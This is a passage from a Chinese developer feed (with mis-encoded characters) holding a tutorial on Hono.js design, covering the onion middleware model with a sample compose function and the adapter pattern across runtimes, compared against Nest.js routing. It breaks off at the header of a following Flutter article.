<li><a href="https://juejin.cn/post/7576555431943503882" target="_blank" title="https://juejin.cn/post/7576555431943503882">æ·±å…¥ Nestjs åº•å±‚æ¦‚å¿µï¼ˆ1ï¼‰ï¼šä¾èµ–æ³¨å…¥å’Œé¢å‘åˆ‡é¢ç¼–ç¨‹ AOP</a></li>
</ul>
<p>å…¶å®è®²çš„æ˜¯å­¦ä¹  nest.js ä¹‹å‰ï¼Œä½ åªæœ‰å¼„æ‡‚äº†è¿™äº›åŸºç¡€æ¦‚å¿µï¼Œä½ æ‰ä¸è¿·ç³Šï¼Œå› ä¸ºå¤§å¤šæ•°å‰ç«¯å¯¹äº nest.js è¿™ç§ç±»ä¼¼ angular çš„ç¼–ç¨‹èŒƒå¼æ¥è§¦ä¸å¤šï¼Œåœ¨ä¸ç†è§£å…¶æ€æƒ³çš„å‰æä¸‹ä½¿ç”¨ï¼Œä¼šéå¸¸åˆ«æ‰­ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬ç¬¬ä¸€å°èŠ‚ï¼Œå°±è¡¥å……ä¸€ä¸‹ï¼Œ hono.js çš„æ ¸å¿ƒè®¾è®¡æ€æƒ³ã€‚</p>
<h2 data-id="heading-1">å‡½æ•°å¼å’Œé¢å‘å¯¹è±¡</h2>
<p>åœ¨ä¹‹å‰çš„æ–‡ç« ï¼š</p>
<ul>
<li><a href="https://juejin.cn/post/7576555431943503882" target="_blank" title="https://juejin.cn/post/7576555431943503882">æ·±å…¥ Nestjs åº•å±‚æ¦‚å¿µï¼ˆ1ï¼‰ï¼šä¾èµ–æ³¨å…¥å’Œé¢å‘åˆ‡é¢ç¼–ç¨‹ AOP</a></li>
</ul>
<p>æˆ‘ä»¬æåˆ°äº†å‡½æ•°å¼ç¼–ç¨‹çš„æ€æƒ³å’Œé¢å‘å¯¹è±¡çš„ç¼–ç¨‹æ€æƒ³ï¼Œnest.js æ˜¯å…¸å‹çš„é¢å‘å¯¹è±¡çš„ç¼–ç¨‹æ€æƒ³ï¼Œå„ç§ç»„ä»¶å…ˆå†™å¯¹è±¡ï¼Œç„¶åè°ƒç”¨ï¼Œå†…éƒ¨æ¨¡å—åŒ–åšçš„å¾ˆå¥½ï¼Œä½¿ç”¨ä¸‹æ¥å¥½å¤„å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯</p>
<ul>
<li>æ¨¡å—æ¸…æ™°ï¼Œè§„èŒƒæ¸…æ™°ï¼Œé€‚åˆå¤§å‹é¡¹ç›®çš„ç»„ç»‡ç»“æ„</li>
</ul>
<p>ç¼ºç‚¹ä¹Ÿæä¸ºæ˜æ˜¾ï¼š</p>
<ul>
<li>ä¸å¦‚ java spring æ¡†æ¶çš„ä¾èµ–æ³¨å…¥å¥½ç”¨</li>
<li>ç”¨èµ·æ¥å¾ˆç¹çï¼ˆè™½ç„¶ä¹Ÿæœ‰ cli å¿«æ·é”®ç”Ÿæˆæ¨¡æ¿ï¼‰ï¼Œä½†æ€»ä½“æ¥è¯´é…ç½®ä¸€ä¸ªæ¥å£ï¼Œæ¶‰åŠåˆ°çš„æ–‡ä»¶æ¯”è¾ƒå¤šï¼Œä»£ç å†™èµ·æ¥æ¯”è¾ƒéº»çƒ¦</li>
<li>è¿˜æœ‰æœ¬èº« nest.js å°¤å…¶æ¥å…¥ express æ¡†æ¶åï¼Œæ€§èƒ½æ˜¯ç®—æ˜¯ node.js æ¡†æ¶ä¸­å«åº•çš„å­˜åœ¨</li>
</ul>
<p>åè§‚ hono.js ï¼Œå±äºä¼ ç»Ÿçš„ç±»ä¼¼ expressï¼Œkoa è¿™ç±»å‡½æ•°å¼ node.js æ¡†æ¶ï¼Œå¾ˆè½»å·§ï¼Œç®€å•ã€‚æˆ‘ä»¬ç”¨ä»£ç å¯¹æ¯”ä¸€ä¸‹åœ¨ä¸åŒç¼–ç¨‹èŒƒå¼ä¸‹ä¹¦å†™ä½“éªŒä¸Šçš„ä¸åŒã€‚</p>
<p>ä¸¾ä¾‹ï¼Œæ–°å»ºä¸€ä¸ªè·¯ç”±ï¼š</p>
<h3 data-id="heading-2">nest.js çš„æ–¹å¼</h3>
<p>Nest.js å»ºè·¯ç”±è¦è‡³å°‘ 3 å±‚ç»“æ„ï¼š</p>
<ol>
<li>controller.ts</li>
</ol>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> { Controller, Get } from <span class="hljs-string">'@nestjs/common'</span>

<span class="hljs-meta">@Controller(<span class="hljs-string">'hello'</span>)</span>
export <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> {
  <span class="hljs-meta">@Get()</span>
  getHello() {
    <span class="hljs-keyword">return</span> <span class="hljs-string">'Hello Nest!'</span>
  }
}
</code></pre>
<ol start="2">
<li>module.tsï¼ˆå¿…é¡»æ³¨å†Œï¼‰</li>
</ol>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> { Module } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>
<span class="hljs-keyword">import</span> { HelloController } <span class="hljs-keyword">from</span> <span class="hljs-string">'./hello.controller'</span>

<span class="hljs-meta">@Module(<span class="hljs-params">{
  controllers: [HelloController],
}</span>)</span>
export <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloModule</span> {}
</code></pre>
<ol start="3">
<li>app.module.tsï¼ˆè¿˜å¿…é¡»å†æ³¨å†Œï¼‰</li>
</ol>
<p>ä¹Ÿå°±æ˜¯æ‰€æœ‰åˆ«çš„ module éƒ½è¦æ³¨å†Œåˆ°æ ¹ module - AppModule</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Module({
  imports: [HelloModule],
})</span>
export <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppModule</span> {}
</code></pre>
<ol start="4">
<li>main.ts å¯åŠ¨ IoC å®¹å™¨</li>
</ol>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">async</span> function <span class="hljs-title">bootstrap</span>()</span> {
  <span class="hljs-keyword">const</span> app = <span class="hljs-keyword">await</span> NestFactory.create(AppModule)
  <span class="hljs-keyword">await</span> app.listen(<span class="hljs-number">3000</span>)
}

bootstrap()
</code></pre>
<h3 data-id="heading-3">hono.js çš„æ–¹å¼</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Hono</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'hono'</span>

<span class="hljs-keyword">const</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hono</span>()

app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/hello'</span>, <span class="hljs-function">(<span class="hljs-params">c</span>) =&gt;</span> c.<span class="hljs-title function_">text</span>(<span class="hljs-string">'Hello Hono!'</span>))

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> app
</code></pre>
<p>å¤§å®¶å¯ä»¥ä½“ä¼šä¸åŒçš„ç¼–ç¨‹èŒƒå¼ï¼Œå¸¦æ¥çš„ä¹¦å†™ä½“éªŒçš„ä¸åŒã€‚æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸‹ hono.js çš„ä¸»è¦çš„ä¸¤ä¸ªè®¾è®¡æ€æƒ³ï¼š</p>
<ul>
<li>æ´‹è‘±æ¨¡å‹ï¼ˆè´£ä»»é“¾æ¨¡å¼ï¼‰</li>
<li>é€‚é…å™¨æ¨¡å‹ï¼ˆé€‚é…å™¨æ¨¡å¼ï¼‰</li>
</ul>
<h2 data-id="heading-4">æ´‹è‘±æ¨¡å‹</h2>
<p>å…ˆçœ‹çœ‹ hono.js åŸºæœ¬çš„ç”¨æ³•, æœ¬æ–‡æ˜¯é€‚é…çš„ node.js ï¼Œhono è¿˜å¯ä»¥é€‚é…ä¸åŒçš„å¹³å°ï¼Œä¾‹å¦‚ deno, bun, next.js ç­‰ç­‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { serve } <span class="hljs-keyword">from</span> <span class="hljs-string">'@hono/node-server'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Hono</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'hono'</span>

<span class="hljs-keyword">const</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hono</span>()

<span class="hljs-comment">// ä¸­é—´ä»¶ A</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-string">'*'</span>, <span class="hljs-keyword">async</span> (c, next) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Before A'</span>)
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'After A'</span>)
})

<span class="hljs-comment">// ä¸­é—´ä»¶ B</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-string">'*'</span>, <span class="hljs-keyword">async</span> (c, next) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Before B'</span>)
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'After B'</span>)
})

app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/'</span>, <span class="hljs-function">(<span class="hljs-params">c</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">text</span>(<span class="hljs-string">'Hello Hono!'</span>)
})

<span class="hljs-title function_">serve</span>({
  <span class="hljs-attr">fetch</span>: app.<span class="hljs-property">fetch</span>,
  <span class="hljs-attr">port</span>: <span class="hljs-number">3000</span>
}, <span class="hljs-function">(<span class="hljs-params">info</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server is running on http://localhost:<span class="hljs-subst">${info.port}</span>`</span>)
})

</code></pre>
<p>è¿™ç§æ´‹è‘±æ¨¡å‹ï¼Œè·Ÿ koa æ¡†æ¶çš„è®¾è®¡å¾ˆç›¸ä¼¼ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•å®ç°ä¸€ä¸‹ï¼Œå¦‚ä½•è®© app.use å¯ä»¥ä¸²è”èµ·æ¥è¿™äº›å‡½æ•°ï¼Œæœ€ç»ˆåˆ°è¾¾ '/hello' è·¯ç”±ã€‚</p>
<p>æˆ‘ä»¬å®ç°ä¸€ä¸ªç®€æ˜“ç‰ˆæœ¬</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hono</span> {
  private <span class="hljs-attr">middleware</span>: <span class="hljs-title class_">Middleware</span>[] = []
  private <span class="hljs-attr">routes</span>: <span class="hljs-title class_">Record</span>&lt;string, <span class="hljs-title class_">Middleware</span>&gt; = {}

  <span class="hljs-title function_">use</span>(<span class="hljs-params">fn: Middleware</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">middleware</span>.<span class="hljs-title function_">push</span>(fn)
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>
  }

  <span class="hljs-title function_">get</span>(<span class="hljs-params">path: string, handler: Middleware</span>) {
    <span class="hljs-comment">// ä¸€æ¬¡æ€§ composeï¼šå…¨å±€ä¸­é—´ä»¶ + è·¯ç”± handler</span>
    <span class="hljs-keyword">const</span> chain = <span class="hljs-title function_">compose</span>([...<span class="hljs-variable language_">this</span>.<span class="hljs-property">middleware</span>, handler])
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span>[path] = chain
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>
  }
  
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-params">req: Request</span>) {
    <span class="hljs-keyword">const</span> path = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(req.<span class="hljs-property">url</span>).<span class="hljs-property">pathname</span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">context</span>: <span class="hljs-title class_">Context</span> = { req, path }

    <span class="hljs-keyword">const</span> fn = <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span>[path]
    <span class="hljs-keyword">if</span> (!fn) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">'Not Found'</span>, { <span class="hljs-attr">status</span>: <span class="hljs-number">404</span> })

    <span class="hljs-keyword">await</span> <span class="hljs-title function_">fn</span>(context)
    <span class="hljs-keyword">return</span> context.<span class="hljs-property">res</span> ?? <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">'OK'</span>)
  }
}
</code></pre>
<p>ä¸Šé¢å®ç°äº†å¾ˆç®€å•çš„ï¼ŒHono ç®€æ˜“å®ç°ä»£ç ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ç®€å•ä½¿ç”¨</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hono</span>()


<span class="hljs-comment">// ä¸­é—´ä»¶ A</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">async</span> (c, next) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Before A'</span>)
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'After A'</span>)
})

<span class="hljs-comment">// ä¸­é—´ä»¶ B</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">async</span> (c, next) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Before B'</span>)
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'After B'</span>)
})
</code></pre>
<p>è¿™é‡Œç›¸å½“äºåœ¨å†…éƒ¨ <code>this.middleware</code> æ•°ç»„ä¸­æ·»åŠ äº†ä¸¤ä¸ªä¸­é—´ä»¶å‡½æ•°ã€‚</p>
<p>æ¥ç€æˆ‘ä»¬è°ƒç”¨</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è·¯ç”±å¤„ç†</span>
app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/hello'</span>, <span class="hljs-function">(<span class="hljs-params">c</span>) =&gt;</span> c.<span class="hljs-title function_">text</span>(<span class="hljs-string">'Hello'</span>))
</code></pre>
<p>å…¶ä¸­ä»£ç æœ€ä¸»è¦çš„æ˜¯,middleware å’Œ get æ–¹æ³•å¯¹åº”å¤„ç†çš„ url ä¸­çš„å›è°ƒå‡½æ•° handler åˆå¹¶äº†</p>
<pre><code class="hljs language-kotlin" lang="kotlin">  <span class="hljs-keyword">get</span>(path: string, handler: Middleware) {
    <span class="hljs-comment">// ä¸€æ¬¡æ€§ composeï¼šå…¨å±€ä¸­é—´ä»¶ + è·¯ç”± handler</span>
    <span class="hljs-keyword">const</span> chain = compose([...<span class="hljs-keyword">this</span>.middleware, handler])
    <span class="hljs-keyword">this</span>.routes[path] = chain
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>
  }
</code></pre>
<p>ä¸»è¦é€šè¿‡çš„æ˜¯ compose å‡½æ•°åˆå¹¶ï¼Œæˆ‘ä»¬ç®€å•çœ‹ä¸‹ compose å‡½æ•°çš„å®ç°ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// compose.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Middleware</span>, <span class="hljs-title class_">Context</span>, <span class="hljs-title class_">Next</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./types'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">compose</span>(<span class="hljs-params">middleware: Middleware[]</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">context: Context, next?: Next</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-keyword">void</span>&gt; {
    <span class="hljs-keyword">let</span> index = -<span class="hljs-number">1</span>

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">dispatch</span>(<span class="hljs-params">i: number</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-keyword">void</span>&gt; {
      <span class="hljs-keyword">if</span> (i &lt;= index) <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'next() called multiple times'</span>))
      index = i
      <span class="hljs-keyword">let</span> <span class="hljs-attr">fn</span>: <span class="hljs-title class_">Middleware</span> | <span class="hljs-literal">undefined</span> = middleware[i]
      <span class="hljs-keyword">if</span> (i === middleware.<span class="hljs-property">length</span>) fn = next
      <span class="hljs-keyword">if</span> (!fn) <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>()
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">fn</span>(context, <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">dispatch</span>(i + <span class="hljs-number">1</span>)))
      } <span class="hljs-keyword">catch</span> (err) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(err)
      }
    }

    <span class="hljs-keyword">return</span> <span class="hljs-title function_">dispatch</span>(<span class="hljs-number">0</span>)
  }
}

</code></pre>
<p>è¯´ç™½äº†ï¼Œcompose å‡½æ•°æ€è·¯å¾ˆç®€å•ï¼Œå°±æ˜¯è°ƒç”¨  dispatch(0) -&gt; ç„¶åå†…éƒ¨è°ƒç”¨ Promise.resolve(fn(context, () =&gt; dispatch(i + 1)))ï¼Œä¹Ÿå°±æ˜¯å°† dispatch å‡½æ•°ä¼ é€’ç»™ä¸­é—´å‡½æ•°ï¼Œè¿™ä¸ªå¯¹åº”çš„æ˜¯, ä»¥ä¸‹ä¸­é—´ä»¶çš„ next å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ next ç­‰äº dispatch(i + 1)</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¸­é—´ä»¶ A</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">async</span> (c, next) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Before A'</span>)
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'After A'</span>)
})
</code></pre>
<p>æ‰€ä»¥åªæœ‰ next å‡½æ•°è‡ªå·±è°ƒç”¨çš„æ—¶å€™ï¼Œä¸­é—´ä»¶æ‰ä¼šç»§ç»­æ‰§è¡Œåˆ°ä¸‹ä¸ªä¸­é—´ä»¶ã€‚</p>
<h3 data-id="heading-5">ä¸ºä»€ä¹ˆå«æ´‹è‘±æ¨¡å‹</h3>
<p>ä»¥ä¸‹ä»£ç çš„æ‰“å°é¡ºåºæ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hono</span>()

<span class="hljs-comment">// ä¸­é—´ä»¶ A</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-string">'*'</span>, <span class="hljs-keyword">async</span> (c, next) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Before A'</span>)
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'After A'</span>)
})

<span class="hljs-comment">// ä¸­é—´ä»¶ B</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-string">'*'</span>, <span class="hljs-keyword">async</span> (c, next) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Before B'</span>)
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>()
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'After B'</span>)
})

<span class="hljs-comment">// è·¯ç”±å¤„ç†</span>
app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/hello'</span>, <span class="hljs-function">(<span class="hljs-params">c</span>) =&gt;</span> c.<span class="hljs-title function_">text</span>(<span class="hljs-string">'Hello'</span>))

</code></pre>
<p>æ‰“å°</p>
<pre><code class="hljs language-arduino" lang="arduino"> console.<span class="hljs-built_in">log</span>(<span class="hljs-string">'Before A'</span>)
 â†“
 console.<span class="hljs-built_in">log</span>(<span class="hljs-string">'Before B'</span>)
 â†“
 æ‰§è¡Œc.<span class="hljs-built_in">text</span>(<span class="hljs-string">'Hello'</span>)
 â†“
 console.<span class="hljs-built_in">log</span>(<span class="hljs-string">'After B'</span>)
 â†“
 console.<span class="hljs-built_in">log</span>(<span class="hljs-string">'After A'</span>)
</code></pre>
<p>å°±åƒåŒ…è£¹ä¸€å±‚æ´‹è‘±ä¸€æ ·çš„æ„Ÿè§‰ã€‚</p>
<p>è¯´å®Œç¬¬ä¸€ä¸ª hono æ ¸å¿ƒè®¾è®¡æ€æƒ³æ´‹è‘±æ¨¡å‹ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥çœ‹ç¬¬äºŒä¸ªï¼</p>
<h2 data-id="heading-6">é€‚é…å™¨æ¨¡å¼</h2>
<p>Hono.js éœ€è¦åœ¨ ä¸åŒè¿è¡Œæ—¶ï¼ˆNode.jsã€Denoã€Bunã€Cloudflare Workers ç­‰ï¼‰ä¸Šè¿è¡Œï¼Œä½†ç”¨æˆ·å¸Œæœ›ç”¨ç»Ÿä¸€æ¥å£ app.get('/', handler)ï¼š</p>
<p>ä¸åŒ runtime çš„ HTTP è¯·æ±‚æ¥å£ä¸åŒï¼š</p>
<ul>
<li>
<p>Node.jsï¼šreq: http.IncomingMessage / res: ServerResponse</p>
</li>
<li>
<p>Cloudflare Workersï¼šreq: Request</p>
</li>
<li>
<p>Denoï¼šreq: RequestEvent</p>
</li>
</ul>
<p>Hono ä¸ä¿®æ”¹ç”¨æˆ·ä»£ç ï¼Œè€Œæ˜¯é€šè¿‡ Adapter å±‚æŠŠä¸åŒ runtime çš„è¯·æ±‚å’Œ Response è½¬æ¢æˆç»Ÿä¸€çš„ Context</p>
<p>è¿™ä¸ª Adapter å°±æ˜¯é€‚é…å™¨ã€‚</p>
<p>é€‚é…å™¨å±‚æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ</p>
<p>å½“ä½ ä½¿ç”¨ node è¿è¡Œ Hono æ—¶ï¼Œä½ å®é™…ä¸Šä¸æ˜¯ç›´æ¥ç”¨ Node çš„ req/resï¼Œè€Œæ˜¯ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { serve } <span class="hljs-keyword">from</span> <span class="hljs-string">'@hono/node-server'</span>

<span class="hljs-title function_">serve</span>({
  <span class="hljs-attr">fetch</span>: app.<span class="hljs-property">fetch</span>,
  <span class="hljs-attr">port</span>: <span class="hljs-number">3000</span>
})

</code></pre>
<p>Node çš„ serve ä¼šï¼š</p>
<ul>
<li>
<p>æ¥æ”¶ Node åŸç”Ÿçš„ req/res</p>
</li>
<li>
<p>è½¬æ¢ä¸º Fetch Request</p>
</li>
<li>
<p>è°ƒç”¨ app.fetch(request)</p>
</li>
<li>
<p>å°† Hono è¿”å›çš„ Response å†è½¬æ¢å› Node çš„ res</p>
</li>
</ul>
<p>åæ­£æ— è®ºæ˜¯ä»€ä¹ˆå¹³å°ï¼Œæœ€ç»ˆç»™ hono çš„ app.fetch(request) ä¸­çš„ request æ»¡è¶³ hono å®šä¹‰çš„æ¥å£å°±è¡Œï¼ˆä¸€èˆ¬éƒ½æ˜¯ web æ ‡å‡†å®šä¹‰çš„ requestï¼‰ã€‚</p>
<p>ä¾‹å¦‚ deno ä¸­ï¼Œè¿™æ ·å¯åŠ¨ deno æœåŠ¡å™¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Deno</span>.<span class="hljs-title function_">serve</span>({ <span class="hljs-attr">port</span>: <span class="hljs-number">8787</span> }, app.<span class="hljs-property">fetch</span>)
</code></pre>
<p>è¿™é‡Œä¸ºä»€ä¹ˆ Deno æ²¡æœ‰å¼•å…¥ hono çš„åŒ…å»åšé€‚é…å‘¢ï¼Œå› ä¸º Denoçš„å»request æœ¬èº«å°±æ˜¯ç¬¦åˆ web æ ‡å‡†çš„ï¼Œåªæœ‰ Node.js ä¸æ˜¯å®Œå…¨ç¬¦åˆçš„ã€‚</p>
<p>åˆ°ç°åœ¨å¤§å®¶æ˜ç™½äº†å§ï¼Œä¹Ÿå°±æ˜¯æœ€ç»ˆä¼ ç»™ app.fetch çš„å‚æ•°ï¼Œä¸€å®šè¦æ˜¯ web æ ‡å‡†å³å¯ã€‚</p>
<h2 data-id="heading-7">æ¬¢è¿ä¸€èµ·äº¤æµ</h2>
<p>æœ€åæ¬¢è¿å¤§å®¶ä¸€èµ·äº¤æµå‰ç«¯å…¨æ ˆç›¸å…³çš„å„ç§çŸ¥è¯†ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬ ai agent å¼€å‘ï¼Œä¸€èµ·è¿›æ­¥ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[flutter-å±å¹•è‡ªé€‚åº”æ’ä»¶flutter_screenutilæ•™ç¨‹å…¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7580389111921786943</link>    <guid>https://juejin.cn/post/7580389111921786943</guid>    <pubDate>2025-12-08T00:21:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580389111921786943" data-draft-id="7580373352421523482" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="flutter-å±å¹•è‡ªé€‚åº”æ’ä»¶flutter_screenutilæ•™ç¨‹å…¨æŒ‡å—"/> <meta itemprop="keywords" content="å‰ç«¯,Flutter,Android"/> <meta itemprop="datePublished" content="2025-12-08T00:21:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¹å¤šå¤š"/> <meta itemprop="url" content="https://juejin.cn/user/747323639737191"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            flutter-å±å¹•è‡ªé€‚åº”æ’ä»¶flutter_screenutilæ•™ç¨‹å…¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/747323639737191/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¹å¤šå¤š
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T00:21:43.000Z" title="Mon Dec 08 2025 00:21:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
